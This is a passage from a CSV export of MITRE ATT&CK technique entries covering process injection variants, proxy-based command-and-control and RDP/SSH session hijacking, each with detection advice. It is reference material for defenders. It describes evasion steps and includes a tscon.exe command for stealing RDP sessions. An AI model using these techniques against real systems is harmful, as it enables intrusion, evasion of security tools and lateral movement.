Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process. ",https://attack.mitre.org/techniques/T1055/002,14 January 2020,18 October 2021,enterprise-attack,1.1,"Defense Evasion, Privilege Escalation","Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code> and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",Windows,"Process: OS API Execution, Process: Process Access, Process: Process Modification",True,T1055,"Anti-virus, Application control",,User,,,,,"(Citation: FireEye CARBANAK June 2017),(Citation: ESET InvisiMole June 2020),(Citation: ESET GreyEnergy Oct 2018),(Citation: GDATA Zeus Panda June 2017),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Talos Rocke August 2018),(Citation: BiZone Lizar May 2021),"
T1055.009,attack-pattern--d201d4cc-214d-4a74-a1ba-b3fa09fd4591,Process Injection: Proc Memory,"Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. 

Proc memory injection involves enumerating the memory of a process via the /proc filesystem (<code>/proc/[pid]</code>) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes’ memory map within <code>/proc/[pid]/maps</code> can be overwritten using dd.(Citation: Uninformed Needle)(Citation: GDS Linux Injection)(Citation: DD Man) 

Other techniques such as [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) may be used to populate a target process with more available gadgets. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), proc memory injection may target child processes (such as a backgrounded copy of sleep).(Citation: GDS Linux Injection) 

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process. ",https://attack.mitre.org/techniques/T1055/009,14 January 2020,20 June 2020,enterprise-attack,1.0,"Defense Evasion, Privilege Escalation","File system monitoring can determine if /proc files are being modified. Users should not have permission to modify these in most cases. 

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",Linux,File: File Modification,True,T1055,"Anti-virus, Application control",,,,,,,","
T1055.013,attack-pattern--7007935a-a8a7-4c0b-bd98-4e85be8ed197,Process Injection: Process Doppelgänging,"Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process. 

Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)

Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017)

Adversaries may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055). Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelgänging Dec 2017)

Process Doppelgänging is implemented in 4 steps (Citation: BlackHat Process Doppelgänging Dec 2017):

* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.
* Load – Create a shared section of memory and load the malicious executable.
* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.
* Animate – Create a process from the tainted section of memory and initiate execution.

This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process. ",https://attack.mitre.org/techniques/T1055/013,14 January 2020,09 February 2021,enterprise-attack,1.0,"Defense Evasion, Privilege Escalation","Monitor and analyze calls to <code>CreateTransaction</code>, <code>CreateFileTransacted</code>, <code>RollbackTransaction</code>, and other rarely used functions indicative of TxF activity. Process Doppelgänging also invokes an outdated and undocumented implementation of the Windows process loader via calls to <code>NtCreateProcessEx</code> and <code>NtCreateThreadEx</code> as well as API calls used to modify memory within another process, such as <code>WriteProcessMemory</code>. (Citation: BlackHat Process Doppelgänging Dec 2017) (Citation: hasherezade Process Doppelgänging Dec 2017)

Scan file objects reported during the PsSetCreateProcessNotifyRoutine, (Citation: Microsoft PsSetCreateProcessNotifyRoutine routine) which triggers a callback whenever a process is created or deleted, specifically looking for file objects with enabled write access. (Citation: BlackHat Process Doppelgänging Dec 2017) Also consider comparing file objects loaded in memory to the corresponding file on disk. (Citation: hasherezade Process Doppelgänging Dec 2017)

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.",Windows,"File: File Metadata, Process: OS API Execution",True,T1055,"Anti-virus, Application control",,"Administrator, SYSTEM, User",,,,,"(Citation: Symantec Leafminer July 2018),(Citation: Cybereason Bazar July 2020),(Citation: Kaspersky Lab SynAck May 2018),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: NCC Group Team9 June 2020),"
T1055.012,attack-pattern--b200542e-e877-4395-875b-cf1a44537ca4,Process Injection: Process Hollowing,"Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  

Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017)

This is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. ",https://attack.mitre.org/techniques/T1055/012,14 January 2020,11 August 2023,enterprise-attack,1.3,"Defense Evasion, Privilege Escalation","Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)

Processing hollowing commonly involves spawning an otherwise benign victim process. Consider correlating detections of processes created in a suspended state (ex: through API flags or process’ thread metadata) with other malicious activity such as attempts to modify a process' memory, especially by its parent process, or other abnormal process behavior.(Citation: Nviso Spoof Command Line 2020)(Citation: Mandiant Endpoint Evading 2019)

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.",Windows,"Process: OS API Execution, Process: Process Access, Process: Process Creation, Process: Process Modification",True,T1055,"Anti-virus, Application control",,User,,,,,"(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Trend Micro DRBControl February 2020),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Forcepoint Monsoon),(Citation: Telefonica Snip3 December 2021),(Citation: Morphisec Snip3 May 2021),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: RecordedFuture WhisperGate Jan 2022),(Citation: Cybereason Astaroth Feb 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: Red Canary NETWIRE January 2020),(Citation: EFF Manul Aug 2016),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Infoblox Lokibot January 2019),(Citation: Cymmetria Patchwork),(Citation: ATT QakBot April 2021),(Citation: Malwarebytes SmokeLoader 2016),(Citation: Cyberreason Anchor December 2019),(Citation: Securelist LuckyMouse June 2018),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Talos Lokibot Jan 2021),(Citation: Cisco Operation Layover September 2021),(Citation: Microsoft Totbrick Oct 2017),(Citation: Accenture Hogfish April 2018),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: OilRig New Delivery Oct 2017),(Citation: FireEye NETWIRE March 2019),(Citation: Cybereason Bazar July 2020),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Nccgroup Emissary Panda May 2018),(Citation: S2 Grupo TrickBot June 2017),(Citation: Profero APT27 December 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Securelist Dtrack),(Citation: Trend Micro Totbrick Oct 2016),(Citation: Unit42 Azorult Nov 2018),(Citation: Microsoft Dofoil 2018),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: TrendMicro Patchwork Dec 2017),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: FireEye Ursnif Nov 2017),(Citation: Symantec W32.Duqu),(Citation: Palo Alto Networks BBSRAT),(Citation: CheckPoint Bandook Nov 2020),(Citation: NCC Group Team9 June 2020),"
T1055.008,attack-pattern--ea016b56-ae0e-47fe-967a-cc0ad51af67f,Process Injection: Ptrace System Calls,"Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. 

Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.(Citation: PTRACE man) Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>) then invoking that memory with <code>PTRACE_SETREGS</code> to set the register containing the next instruction to execute. Ptrace system call injection can also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>, which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction). (Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018) 

Ptrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.(Citation: BH Linux Inject) 

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process. ",https://attack.mitre.org/techniques/T1055/008,14 January 2020,18 October 2021,enterprise-attack,1.1,"Defense Evasion, Privilege Escalation","Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits) 

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",Linux,"Process: OS API Execution, Process: Process Access, Process: Process Modification",True,T1055,"Anti-virus, Application control",,,,,,,","
T1055.003,attack-pattern--41d9846c-f6af-4302-a654-24bba2729bc6,Process Injection: Thread Execution Hijacking,"Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. 

Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Elastic Process Injection July 2017)

This is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) but targets an existing process rather than creating a process in a suspended state.  

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process. ",https://attack.mitre.org/techniques/T1055/003,14 January 2020,18 October 2021,enterprise-attack,1.1,"Defense Evasion, Privilege Escalation","Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",Windows,"Process: OS API Execution, Process: Process Access, Process: Process Modification",True,T1055,"Anti-virus, Application control",,User,,,,,"(Citation: ESET Gazer Aug 2017),(Citation: Trend Micro Waterbear December 2019),(Citation: Securelist WhiteBear Aug 2017),(Citation: Secureworks Karagany July 2019),"
T1055.005,attack-pattern--e49ee9d2-0d98-44ef-85e5-5d3100065744,Process Injection: Thread Local Storage,"Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. 

TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other [Process Injection](https://attack.mitre.org/techniques/T1055) techniques such as [Process Hollowing](https://attack.mitre.org/techniques/T1055/012).(Citation: FireEye TLS Nov 2017)

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process. ",https://attack.mitre.org/techniques/T1055/005,14 January 2020,18 October 2021,enterprise-attack,1.1,"Defense Evasion, Privilege Escalation","Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",Windows,"Process: OS API Execution, Process: Process Access, Process: Process Modification",True,T1055,"Anti-virus, Application control",,,,,,,"(Citation: TrendMicro Ursnif Mar 2015),(Citation: FireEye Ursnif Nov 2017),(Citation: TrendMicro PE_URSNIF.A2),"
T1055.014,attack-pattern--98be40f2-c86b-4ade-b6fc-4964932040e5,Process Injection: VDSO Hijacking,"Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. 

VDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008). However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).(Citation: ELF Injection May 2009)(Citation: Backtrace VDSO)(Citation: VDSO Aug 2005)(Citation: Syscall 2014)

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.  ",https://attack.mitre.org/techniques/T1055/014,14 January 2020,07 July 2022,enterprise-attack,1.1,"Defense Evasion, Privilege Escalation","Monitor for malicious usage of system calls, such as ptrace and mmap, that can be used to attach to, manipulate memory, then redirect a processes' execution path. Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)(Citation: GNU Acct)(Citation: RHEL auditd)(Citation: Chokepoint preload rootkits) 

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",Linux,"Module: Module Load, Process: OS API Execution",True,T1055,"Anti-virus, Application control",,,,,,,","
T1090.004,attack-pattern--ca9d3402-ada3-484d-876a-d717bd6e05f2,Proxy: Domain Fronting,"Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, ""domainless"" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).

For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",https://attack.mitre.org/techniques/T1090/004,14 March 2020,30 March 2023,enterprise-attack,1.1,Command and Control,"If SSL inspection is in place or the traffic is not encrypted, the Host field of the HTTP header can be checked if it matches the HTTPS SNI or against a blocklist or allowlist of domain names. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015)","Linux, Windows, macOS",Network Traffic: Network Traffic Content,True,T1090,,"Matt Kelly, @breakersall",,,,,,"(Citation: Mandiant No Easy Breach),(Citation: Mythc Documentation),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Cobalt Strike Manual 4.3 November 2020),"
T1090.002,attack-pattern--69b8fd78-40e8-4600-ae4d-662c9d7afdb3,Proxy: External Proxy,"Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.

External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",https://attack.mitre.org/techniques/T1090/002,14 March 2020,27 March 2020,enterprise-attack,1.0,Command and Control,"Analyze network data for uncommon data flows, such as a client sending significantly more data than it receives from an external server. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","Linux, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1090,,,,,,,,"(Citation: TrendMicro Tonto Team October 2020),(Citation: FireEye APT10 Sept 2018),(Citation: Bitdefender Trickbot C2 infra Nov 2020),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Trend Micro Muddy Water March 2021),(Citation: TrendMicro macOS Dacls May 2020),(Citation: Mandiant APT29 Eye Spy Email Nov 22),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: FireEye APT28),(Citation: ESET Okrum July 2019),(Citation: Novetta Winnti April 2015),(Citation: ESET InvisiMole June 2018),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: Symantec MuddyWater Dec 2018),(Citation: FireEye MuddyWater Mar 2018),(Citation: Bitdefender APT28 Dec 2015),(Citation: Cybereason Soft Cell June 2019),(Citation: Kaspersky Regin),(Citation: Kaspersky QakBot September 2021),(Citation: Group IB Silence Sept 2018),(Citation: FireEye APT10 April 2017),(Citation: FOX-IT May 2016 Mofang),(Citation: Reaqta MuddyWater November 2017),(Citation: FireEye Operation Double Tap),(Citation: Mythc Documentation),(Citation: BitDefender Chafer May 2020),(Citation: ESET InvisiMole June 2020),(Citation: Bitdefender Trickbot VNC module Whitepaper 2021),(Citation: University of Birmingham C2)"
T1090.001,attack-pattern--f6dacc85-b37d-458e-b58d-74fc4bbf5755,Proxy: Internal Proxy,"Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.

By using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",https://attack.mitre.org/techniques/T1090/001,14 March 2020,15 March 2020,enterprise-attack,1.0,Command and Control,Analyze network data for uncommon data flows between clients that should not or often do not communicate with one another. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2),"Linux, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1090,,,,,,,,"(Citation: Talos TinyTurla September 2021),(Citation: CrowdStrike StellarParticle January 2022),(Citation: FireEye APT39 Jan 2019),(Citation: Symantec RAINDROP January 2021),(Citation: Kaspersky ProjectSauron Blog),(Citation: FoxIT Wocao December 2019),(Citation: Accenture HyperStack October 2020),(Citation: ClearkSky Fox Kitten February 2020),(Citation: Novetta Winnti April 2015),(Citation: Symantec W32.Duqu),(Citation: ESET InvisiMole June 2018),(Citation: Zscaler Higaisa 2020),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Novetta-Axiom),(Citation: ESET Sednit Part 2),(Citation: ESET Dukes October 2019),(Citation: FireEye APT30),(Citation: Check Point Pay2Key November 2020),(Citation: Mythc Documentation),(Citation: BitDefender Chafer May 2020),(Citation: NSA/FBI Drovorub August 2020),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: cobaltstrike manual),(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: Microsoft Volt Typhoon May 2023),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: University of Birmingham C2)"
T1090.003,attack-pattern--a782ebe2-daba-42c7-bc82-e8e9d923162d,Proxy: Multi-hop Proxy,"To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source. A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network. (Citation: Onion Routing)

In the case of network infrastructure, particularly routers, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain within the Wide-Area Network (WAN) of the enterprise.  By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001), adversaries can add custom code to the affected network devices that will implement onion routing between those nodes.  This custom onion routing network will transport the encrypted C2 traffic through the compromised population, allowing adversaries to communicate with any device within the onion routing network.  This method is dependent upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method in order to allow the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s WAN. Protocols such as ICMP may be used as a transport.",https://attack.mitre.org/techniques/T1090/003,14 March 2020,21 October 2020,enterprise-attack,2.0,Command and Control,"When observing use of Multi-hop proxies, network data from the actual command and control servers could allow correlating incoming and outgoing flows to trace malicious traffic back to its source. Multi-hop proxies can also be detected by alerting on traffic to known anonymity networks (such as [Tor](https://attack.mitre.org/software/S0183)) or known adversary infrastructure that uses this technique.

In context of network devices, monitor traffic for encrypted communications from the Internet that is addressed to border routers.  Compare this traffic with the configuration to determine whether it matches with any configured site-to-site Virtual Private Network (VPN) connections the device was intended to have. Monitor traffic for encrypted communications originating from potentially breached routers that is addressed to other routers within the organization.  Compare the source and destination with the configuration of the device to determine if these channels are an authorized Virtual Private Network (VPN) connections or other encrypted modes of communication. Monitor ICMP traffic from the Internet that is addressed to border routers and is encrypted.  Few if any legitimate use cases exist for sending encrypted data to a network device via ICMP.","Linux, Network, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1090,,,,,,,,"(Citation: ESET Kobalos Jan 2021),(Citation: Dragos Crashoverride 2017),(Citation: Mandiant No Easy Breach),(Citation: ESET GreyEnergy Oct 2018),(Citation: ProofPoint Ursnif Aug 2016),(Citation: ESET Attor Oct 2019),(Citation: SecureWorks WannaCry Analysis),(Citation: Bitdefender StrongPity June 2020),(Citation: BlackBerry CostaRicto November 2020),(Citation: FoxIT Wocao December 2019),(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023),(Citation: NCSC CISA Cyclops Blink Advisory February 2022),(Citation: NJCCIC Ursnif Sept 2016),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Symantec Inception Framework March 2018),(Citation: Checkpoint Dridex Jan 2021),(Citation: MSTIC Nobelium Oct 2021),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: Dingledine Tor The Second-Generation Onion Router),(Citation: ESET Kobalos Feb 2021),(Citation: synack 2016 review),(Citation: objsee mac malware 2017),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: Unit 42 Siloscape Jun 2021),"
T1563.002,attack-pattern--e0033c16-a07e-48aa-8204-7c3ca669998c,Remote Service Session Hijacking: RDP Hijacking,"Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)

Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\windows\system32\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions.(Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf)",https://attack.mitre.org/techniques/T1563/002,25 February 2020,14 August 2023,enterprise-attack,1.1,Lateral Movement,"Consider monitoring processes for `tscon.exe` usage and monitor service creation that uses `cmd.exe /k` or `cmd.exe /c` in its arguments to detect RDP session hijacking.

Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP.",Windows,"Command: Command Execution, Logon Session: Logon Session Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation",True,T1563,,,,,,,,"(Citation: LogRhythm WannaCry),(Citation: Novetta-Axiom),(Citation: Windows RDP Sessions)"
T1563.001,attack-pattern--4d2a5b3e-340d-4600-9123-309dd63c9bf8,Remote Service Session Hijacking: SSH Hijacking,"Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.

In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.(Citation: Slideshare Abusing SSH)(Citation: SSHjack Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach Post-mortem SSH Hijack)

